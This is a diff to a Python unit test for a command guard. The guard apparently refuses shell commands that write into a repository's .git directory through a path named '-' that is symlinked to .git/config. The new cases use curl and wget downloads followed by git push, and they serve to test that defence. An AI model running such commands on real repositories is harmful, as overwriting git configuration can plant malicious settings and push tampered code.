@@ -744,7 +744,10 @@ class Identity(unittest.TestCase):
         # operand, it is a path, which may be a link into git's directory.
         dashed = repo(fresh=True)
         (dashed / "-").symlink_to(dashed / ".git" / "config")
-        for command in ("cp -- /tmp/payload -; git push", "tee - < /tmp/payload; git push"):
+        for command in ("cp -- /tmp/payload -; git push", "tee - < /tmp/payload; git push",
+                        # A directory named -, given to curl's --output-dir or wget's -P, is a path too.
+                        "curl --output-dir - -O https://example.com/config; git push",
+                        "wget -P - https://example.com/config; git push"):
             self.assertIn("git_directory_written", self.refused(command, dashed), command)
         self.assertEqual(self.codes("cd .git && tar -cf - hooks > /tmp/h.tar && curl -o - https://example.com/y && "
                                     "cd .. && git push"), "")
